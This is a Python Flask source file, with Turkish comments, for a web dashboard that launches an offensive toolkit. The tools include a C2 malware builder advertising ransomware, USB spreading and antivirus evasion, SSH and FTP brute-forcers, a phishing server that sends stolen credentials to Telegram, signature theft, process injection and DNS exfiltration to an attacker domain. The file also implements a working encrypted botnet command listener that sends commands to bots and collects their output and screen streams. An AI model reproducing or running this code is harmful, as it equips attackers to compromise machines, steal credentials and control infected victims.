#!/usr/bin/env python3
"""
Web Dashboard for The Ultimate Pentest Arsenal - ELITE VERSION
==============================================================
Tüm araçları destekleyen, Sidebar tasarımlı profesyonel Flask sunucusu.
"""
import os
import sys
import subprocess
import json
import traceback
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'arsenal_super_secret_key_v8'
base_dir = os.path.dirname(os.path.abspath(__file__))

# Tüm araçların kategorileri ve gereksinim duydukları inputlar (Detaylı Açıklamalarla)
TOOLS_CONFIG = [
    {
        "category": "Elite & Automation",
        "icon": "fa-robot",
        "tools": [
            {
                "id": "c2_builder",
                "name": "C2 Payload Builder (God-Tier)",
                "path": "RedTeam_C2.py",
                "desc": "Hedef sistemi ele geçirmek için AES-256 şifreli, Anti-VM korumalı bir EXE virüsü oluşturur. Özellikler: USB Spreader (!spread), Ransomware (!ransom), Ekran Yayını (!stream_start), Auto-Root (!autoroot) ve Self-Destruct (!suicide). (Not: Web arayüzünden tetiklendiğinde standart setup.exe olarak 'stealth_dropper' klasörüne derler.)",
                "inputs": [
                    {"name": "lhost", "type": "text", "placeholder": "örn: 192.168.1.10", "label": "Saldırgan IP (LHOST)"},
                    {"name": "lport", "type": "text", "placeholder": "örn: 443", "label": "Saldırgan Port (LPORT)"}
                ]
            },
            {
                "id": "autopwn",
                "name": "Auto-Pwn (Otopilot Sızma Motoru)",
                "path": "Auto_Pwn.py",
                "desc": "Belirttiğiniz hedef IP adresi üzerinde tam otomatik bir sızma testi (Pentest) gerçekleştirir. Önce açık portları tarar (Nmap stili), ardından 21 (FTP), 22 (SSH) veya 80 (HTTP) gibi kritik portlar bulduğunda otomatik olarak uygun Exploit veya Brute-Force araçlarını sırasıyla çalıştırarak sistemi ele geçirmeye çalışır.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: 192.168.1.5", "label": "Hedef IP"},
                    {"name": "arg2", "type": "text", "placeholder": "Wordlist Yolu (Opsiyonel)", "label": "Kullanılacak Wordlist"}
                ]
            }
        ]
    },
    {
        "category": "OSINT (Açık Kaynak İstihbarat)",
        "icon": "fa-search",
        "tools": [
            {
                "id": "email_harvest",
                "name": "Email Harvester",
                "path": "OSINT/Email_Harvester.py",
                "desc": "Saldırı öncesi bilgi toplama aşamasında kullanılır. Hedef kuruma ait sızmış, internette dolaşan e-posta adreslerini arama motorları üzerinden tarayarak listeler. Oltalama (Phishing) saldırıları için kritik bir adımdır.",
                "inputs": [{"name": "arg1", "type": "text", "placeholder": "örn: example.com", "label": "Hedef Domain"}]
            },
            {
                "id": "whois_lookup",
                "name": "Whois Lookup",
                "path": "OSINT/Whois_Lookup.py",
                "desc": "Hedef domainin tescil bilgilerini, sahibini, oluşturulma tarihini ve hangi sunucularda (NameServer) barındığını gösteren detaylı bir analiz raporu sunar.",
                "inputs": [{"name": "arg1", "type": "text", "placeholder": "örn: example.com", "label": "Hedef Domain"}]
            }
        ]
    },
    {
        "category": "Network Recon (Ağ Keşfi)",
        "icon": "fa-network-wired",
        "tools": [
            {
                "id": "dns_enum",
                "name": "DNS Enumerator & Subdomain Tarayıcı",
                "path": "Network Recon/DNS_Enumerator.py",
                "desc": "Hedef alan adının arka planındaki tüm DNS kayıtlarını (A, MX, TXT vb.) çeker ve potansiyel alt alan adlarını (subdomain) tespit eder.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: example.com", "label": "Domain"},
                    {"name": "arg2", "type": "text", "placeholder": "", "label": "Wordlist Yolu (Opsiyonel)"}
                ]
            },
            {
                "id": "net_scan",
                "name": "Local Network Scanner",
                "path": "Network Recon/Network_Scanner.py",
                "desc": "İç ağınızdaki (LAN) tüm cihazların IP ve MAC adreslerini saniyeler içinde tarar. Hedefleri belirlemek için ilk kullanılması gereken ağ aracıdır.",
                "inputs": [{"name": "arg1", "type": "text", "placeholder": "örn: 192.168.1.0/24", "label": "Hedef Ağ (CIDR Formatı)"}]
            },
            {
                "id": "arp_spoof",
                "name": "ARP Spoofer (MITM)",
                "path": "Network Recon/ARP_Spoofer.py",
                "desc": "Kurban ile modem arasındaki trafiği manipüle ederek araya girmenizi (Man-in-the-Middle) sağlar. Dikkat: Bu işlem arka planda çalışmaya devam eder ve manuel durdurulması gerekir.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: 192.168.1.10", "label": "Kurban IP Adresi"},
                    {"name": "arg2", "type": "text", "placeholder": "örn: 192.168.1.1", "label": "Modem (Gateway) IP"}
                ]
            },
            {
                "id": "dns_listener",
                "name": "DNS Sızdırma Dinleyicisi (Listener)",
                "path": "Network Recon/DNS_Server_Listener.py",
                "desc": "DNS Tunneling ile dışarı çıkarılan gizli verileri yakalamak için 53 (UDP) portunu dinler ve parçalanmış paketleri birleştirerek orijinal dosyayı oluşturur.",
                "inputs": [{"name": "arg1", "type": "text", "placeholder": "örn: 0.0.0.0", "label": "Dinlenecek IP"}]
            }
        ]
    },
    {
        "category": "Web Exploitation",
        "icon": "fa-globe",
        "tools": [
            {
                "id": "cms_scan",
                "name": "CMS Zafiyet Tarayıcı",
                "path": "Web Exploitation/CMS_Scanner.py",
                "desc": "Verilen web sitesinin WordPress, Joomla veya Drupal gibi bir altyapı kullanıp kullanmadığını anlar, versiyon bilgisini çıkarır ve bilinen zaafiyetli eklentileri arar.",
                "inputs": [{"name": "arg1", "type": "text", "placeholder": "örn: http://example.com", "label": "Hedef Web Sitesi (URL)"}]
            },
            {
                "id": "dir_brute",
                "name": "Directory Bruteforcer (DirBuster)",
                "path": "Web Exploitation/Directory_Bruteforcer.py",
                "desc": "Web sunucusundaki gizli klasörleri, unutulmuş yedek dosyalarını (backup.zip vb.) ve yetkisiz erişime açık panelleri kaba kuvvet (sözlük saldırısı) ile tespit eder.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: http://example.com", "label": "Hedef URL"},
                    {"name": "arg2", "type": "text", "placeholder": "wordlists/common.txt", "label": "Wordlist Yolu"}
                ]
            },
            {
                "id": "sqli_test",
                "name": "SQL Injection (SQLi) Tester",
                "path": "Web Exploitation/SQLi_Tester.py",
                "desc": "Veritabanı sızıntısına yol açan SQL Injection hatalarını test etmek için verilen URL parametrelerine özel saldırı vektörleri gönderir.",
                "inputs": [{"name": "arg1", "type": "text", "placeholder": "örn: http://example.com/page?id=1", "label": "Zafiyetli Olabilecek URL"}]
            },
            {
                "id": "xss_test",
                "name": "XSS (Cross-Site Scripting) Scanner",
                "path": "Web Exploitation/XSS_Scanner.py",
                "desc": "Kullanıcı girdilerinin temizlenmediği noktalarda çalışan kötü amaçlı JavaScript kodlarını (XSS) tespit etmek için tarama yapar.",
                "inputs": [{"name": "arg1", "type": "text", "placeholder": "örn: http://example.com/search?q=", "label": "Arama veya Girdi URL'si"}]
            }
        ]
    },
    {
        "category": "Password Cracking",
        "icon": "fa-key",
        "tools": [
            {
                "id": "ssh_brute",
                "name": "SSH Bruteforce",
                "path": "Password Cracking/SSH_Bruteforce.py",
                "desc": "Linux/Sunucu sistemlerine izinsiz giriş yapmak amacıyla, SSH servisine (Port 22) belirtilen kelime listesi (wordlist) ile kaba kuvvet saldırısı düzenler.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: 192.168.1.10", "label": "Sunucu IP Adresi"},
                    {"name": "arg2", "type": "text", "placeholder": "örn: root", "label": "Kullanıcı Adı"},
                    {"name": "arg3", "type": "text", "placeholder": "wordlists/passwords.txt", "label": "Wordlist Yolu"}
                ]
            },
            {
                "id": "ftp_brute",
                "name": "FTP Bruteforce",
                "path": "Password Cracking/FTP_Bruteforce.py",
                "desc": "Dosya transfer sunucularına (FTP - Port 21) izinsiz erişim sağlamak için parola tahmin etme saldırısı yapar.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: 192.168.1.10", "label": "Sunucu IP Adresi"},
                    {"name": "arg2", "type": "text", "placeholder": "örn: admin", "label": "Kullanıcı Adı"},
                    {"name": "arg3", "type": "text", "placeholder": "wordlists/passwords.txt", "label": "Wordlist Yolu"}
                ]
            },
            {
                "id": "hash_crack",
                "name": "Offline Hash Cracker",
                "path": "Password Cracking/Hash_Cracker.py",
                "desc": "Sistemlerden sızdırılmış (ele geçirilmiş) şifreli metinlerin (MD5, SHA1, SHA256) orijinal hallerini, milyonlarca kelimenin bulunduğu dosyalarla eşleştirerek çözer.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: 5d41402abc4b2a76b9719d911017c592", "label": "Kırılacak Hash Metni"},
                    {"name": "arg2", "type": "text", "placeholder": "wordlists/passwords.txt", "label": "Wordlist Yolu"}
                ]
            }
        ]
    },
    {
        "category": "Social Engineering",
        "icon": "fa-user-secret",
        "tools": [
            {
                "id": "phishing",
                "name": "Phishing (Oltalama) Server",
                "path": "Social Engineering/Phishing_Server.py",
                "desc": "Hedef kullanıcıyı kandırmak için sahte bir kurumsal giriş ekranı oluşturur. Kurban kullanıcı adı ve şifresini girdiğinde bunları kaydeder, Telegram botunuza gönderir ve kurbanı orijinal siteye yönlendirir.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: 8080", "label": "Dinlenecek Port"},
                    {"name": "arg2", "type": "text", "placeholder": "örn: https://google.com", "label": "Orijinal (Yönlendirilecek) URL"},
                    {"name": "arg3", "type": "text", "placeholder": "örn: Kurumsal Ağ Girişi", "label": "Sahte Sayfa Başlığı"}
                ]
            }
        ]
    },
    {
        "category": "AV Evasion (Antivirüs Atlatma)",
        "icon": "fa-ghost",
        "tools": [
            {
                "id": "sigthief",
                "name": "SigThief (Dijital İmza Çalma)",
                "path": "AV Evasion/SigThief.py",
                "desc": "Orijinal ve güvenilir bir programdan (Örn: Microsoft imzalı bir .exe) dijital imza sertifikasını kopyalar ve zararlı Payload'ınıza yapıştırır. Bu, Güvenlik Duvarlarını ve EDR/AV yazılımlarını atlatmak için harika bir yoldur.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: C:\\Windows\\explorer.exe", "label": "Orijinal (İmzalı) EXE Yolu"},
                    {"name": "arg2", "type": "text", "placeholder": "örn: stealth_dropper/setup.exe", "label": "Zararlı (Hedef) EXE Yolu"}
                ]
            },
            {
                "id": "process_injector",
                "name": "Process Injector (Hayalet Modu)",
                "path": "AV Evasion/Process_Injector.py",
                "desc": "CTypes ile Windows API'lerini çağırarak, raw (saf) shellcode dosyanızı aktif olarak çalışan yasal bir sistem işleminin (örn: explorer.exe) hafıza alanına enjekte eder (VirtualAllocEx & CreateRemoteThread).",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: explorer.exe", "label": "Hedef Yasal İşlem (Process)"},
                    {"name": "arg2", "type": "text", "placeholder": "örn: payload.bin", "label": "Raw Shellcode Dosyası"}
                ]
            },
            {
                "id": "dns_exfiltrator",
                "name": "DNS Exfiltrator (Veri Sızdırma)",
                "path": "Post-Exploitation/DNS_Exfiltrator.py",
                "desc": "Çalınan bir dosyayı Firewall ve IPS sistemlerinden gizlemek için Base32 ile kodlar ve sahte DNS sorguları (nslookup) aracılığıyla dışarı çıkartır.",
                "inputs": [
                    {"name": "arg1", "type": "text", "placeholder": "örn: passwords.txt", "label": "Sızdırılacak Dosya"},
                    {"name": "arg2", "type": "text", "placeholder": "örn: attacker.com", "label": "Saldırgan (Listener) Domaini"}
                ]
            }
        ]
    }
]

@app.before_request
def check_auth():
    if request.endpoint not in ['login', 'static'] and not session.get('logged_in'):
        return redirect(url_for('login'))

def get_admin_password():
    try:
        with open(os.path.join(base_dir, 'config.json'), 'r') as f:
            return json.load(f).get('admin_password', 'admin')
    except:
        return 'admin'

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == get_admin_password():
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            error = "ACCESS DENIED - INVALID ENCRYPTION KEY"
    return render_template('login.html', error=error)

@app.route('/')
def index():
    # JSON objesini HTML içerisine render etmek için yolluyoruz
    return render_template('index.html', tools_config=json.dumps(TOOLS_CONFIG))

@app.route('/api/run', methods=['POST'])
def api_run():
    data = request.json
    tool_id = data.get('tool_id')
    args_dict = data.get('args', {})
    
    # Tool'u bul
    target_tool = None
    for category in TOOLS_CONFIG:
        for tool in category['tools']:
            if tool['id'] == tool_id:
                target_tool = tool
                break
        if target_tool: break
        
    if not target_tool:
        return jsonify({"status": "error", "output": "Araç bulunamadı!"})
        
    script_path = os.path.join(base_dir, target_tool['path'])
    if not os.path.exists(script_path):
        return jsonify({"status": "error", "output": f"Dosya bulunamadı: {target_tool['path']}"})
        
    # Parametreleri listeye çevir (arg1, arg2...)
    cmd_args = []
    # inputs sayısına göre argüman bekle
    for req_in in target_tool.get('inputs', []):
        val = args_dict.get(req_in['name'], "").strip()
        if val:
            cmd_args.append(val)
            
    # Phishing Server gibi sürekli arka planda çalışanları özel olarak ayır
    if tool_id == "phishing":
        cmd = [sys.executable, script_path] + cmd_args
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        port = cmd_args[0] if len(cmd_args)>0 else "8080"
        return jsonify({"status": "success", "output": f"[*] Phishing Server arka planda başlatıldı!\n[+] Adres: http://localhost:{port}/\n[+] Bildirimler (Notifier.py) aktifse şifreler size iletilecektir."})

    if tool_id == "c2_builder":
        lhost = args_dict.get("lhost", "")
        lport = args_dict.get("lport", "")
        if not lhost or not lport:
            return jsonify({"status": "error", "output": "LHOST ve LPORT alanları zorunludur!"})
            
        sys.path.append(base_dir)
        try:
            import RedTeam_C2
            import threading
            
            def build_thread():
                RedTeam_C2.c2_payload_builder(
                    auto_lhost=lhost,
                    auto_lport=lport,
                    auto_os='1',
                    auto_antisb=True,
                    auto_exename="setup"
                )
            
            threading.Thread(target=build_thread, daemon=True).start()
            return jsonify({
                "status": "success", 
                "output": f"[*] God-Tier Payload oluşturma işlemi başlatıldı.\n[+] Hedef IP: {lhost}\n[+] Port: {lport}\n[+] Lütfen bekleyin. Nuitka derlemesi 1-5 dakika sürebilir.\n[+] İşlem bitince 'stealth_dropper/setup.exe' oluşacaktır."
            })
        except Exception as e:
            return jsonify({"status": "error", "output": f"C2 Builder Başlatılamadı: {e}"})

    cmd = [sys.executable, script_path] + cmd_args
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = result.stdout + "\n" + result.stderr
        return jsonify({"status": "success", "output": output})
    except subprocess.TimeoutExpired:
        return jsonify({"status": "error", "output": "İşlem 120 saniyeyi aştığı için sonlandırıldı."})
    except Exception as e:
        return jsonify({"status": "error", "output": f"Hata oluştu:\n{traceback.format_exc()}"})

# ================= C2 BOTNET LISTENER =================
connected_bots = {}
c2_listener_running = False

def bot_handler(bot_id, client_socket, aes_key):
    import base64
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    
    bot = connected_bots[bot_id]
    
    while True:
        buffer = b""
        try:
            while not buffer.endswith(b"\n"):
                chunk = client_socket.recv(4096)
                if not chunk: break
                buffer += chunk
            if not buffer: break
            
            try:
                raw = base64.b64decode(buffer.strip())
                iv = raw[:16]
                ct = raw[16:]
                cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                plain = unpad(cipher.decrypt(ct), AES.block_size)
                
                # Check if it's a stream frame
                if plain.startswith(b"[STREAM_FRAME] "):
                    bot["stream_frame"] = plain.split(b" ", 1)[1].decode('utf-8')
                else:
                    bot["output"].append(plain.decode('utf-8', errors='replace'))
            except:
                bot["output"].append(buffer.decode('utf-8', errors='replace'))
        except:
            break
            
    if bot_id in connected_bots:
        del connected_bots[bot_id]

def start_c2_listener_thread(port):
    import socket
    import threading
    global c2_listener_running
    
    try:
        with open(os.path.join(base_dir, "c2_aes_key.txt"), "r") as f:
            aes_key = f.read().strip().encode('utf-8')
    except:
        aes_key = b"12345678901234567890123456789012" # Fallback
        
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', int(port)))
        s.listen(10)
        c2_listener_running = True
        
        while True:
            client, addr = s.accept()
            bot_id = f"{addr[0]}_{addr[1]}"
            connected_bots[bot_id] = {
                "ip": addr[0],
                "port": addr[1],
                "socket": client,
                "key": aes_key,
                "output": [],
                "stream_frame": ""
            }
            threading.Thread(target=bot_handler, args=(bot_id, client, aes_key), daemon=True).start()
    except Exception as e:
        print(f"C2 Listener Error: {e}")
        c2_listener_running = False

@app.route('/api/c2/start', methods=['POST'])
def api_c2_start():
    global c2_listener_running
    if c2_listener_running:
        return jsonify({"status": "error", "message": "Listener is already running."})
        
    port = request.json.get('port', 443)
    import threading
    threading.Thread(target=start_c2_listener_thread, args=(port,), daemon=True).start()
    return jsonify({"status": "success", "message": f"C2 Listener started on port {port}"})

@app.route('/api/c2/bots', methods=['GET'])
def api_c2_bots():
    bots_list = []
    for bid, bdata in connected_bots.items():
        bots_list.append({"id": bid, "ip": bdata["ip"], "port": bdata["port"]})
    return jsonify({"status": "success", "bots": bots_list, "running": c2_listener_running})

@app.route('/api/c2/send_cmd', methods=['POST'])
def api_c2_send_cmd():
    import base64
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    
    data = request.json
    bot_id = data.get('bot_id')
    cmd = data.get('cmd', '').strip()
    
    if bot_id not in connected_bots:
        return jsonify({"status": "error", "message": "Bot not found or disconnected."})
        
    bot = connected_bots[bot_id]
    try:
        cipher = AES.new(bot["key"], AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(cmd.encode('utf-8'), AES.block_size))
        enc_cmd = base64.b64encode(cipher.iv + ct_bytes)
        
        bot["socket"].send(enc_cmd + b"\n")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/c2/output/<bot_id>', methods=['GET'])
def api_c2_output(bot_id):
    if bot_id not in connected_bots:
        return jsonify({"status": "error", "message": "Bot disconnected."})
        
    bot = connected_bots[bot_id]
    out = "".join(bot["output"])
    bot["output"] = [] # Clear buffer after reading
    stream = bot.get("stream_frame", "")
    return jsonify({"status": "success", "output": out, "stream_frame": stream})

def start_web_server(port=5000):
    print(f"\n\033[92m[*] Premium Web Dashboard Başlatılıyor...\033[0m")
    print(f"\033[96m[+] Tarayıcınızdan şu adrese gidin:\033[0m \033[4mhttp://127.0.0.1:{port}/\033[0m")
    print(f"\033[90m(Web arayüzünü kapatmak için terminalde CTRL+C yapın)\033[0m\n")
    
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    start_web_server()
